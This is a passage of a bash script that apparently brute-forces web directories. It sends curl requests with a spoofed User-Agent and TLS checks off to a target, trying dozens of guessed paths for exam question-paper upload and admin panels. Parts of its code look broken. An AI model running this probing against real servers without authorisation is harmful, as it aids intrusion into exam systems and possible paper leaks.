code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor-DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal-QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal-QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUploadTestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUploadTestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MgmtQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MgmtQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuite_QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuite_QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload-System/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload-System/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch-Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch-Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline-QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline-QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaperDataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaperDataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessorQPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessorQPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler-Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler-Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingQPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingQPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System_QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System_QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline_QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline_QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUploadQPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUploadQPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_PManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_PManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps_Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps_Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper-Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper-Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploaderQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploaderQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster-Tool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster-Tool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSync-QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSync-QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipelineQstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipelineQstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper-Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper-Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Sync_QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Sync_QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk_AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk_AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager_Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager_Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModuleQPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModuleQPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUploadQPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUploadQPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManagerDataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManagerDataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManagerQPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManagerQPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControlProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControlProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud_Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud_Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk_ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk_ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops-QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops-QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt_Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt_Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ControlExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ControlExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl_DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl_DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFilePanel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFilePanel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadDataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadDataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Monitoring-QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Monitoring-QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SyncQPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SyncQPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipelineExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipelineExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler_Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler_Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper-Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper-Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile_Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile_Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControlDataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControlDataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModule_QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModule_QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_PAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_PAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData_BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData_BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch_Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch_Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer_QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer_QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Service-QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Service-QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin_QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin_QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper-AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper-AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile_BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile_BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
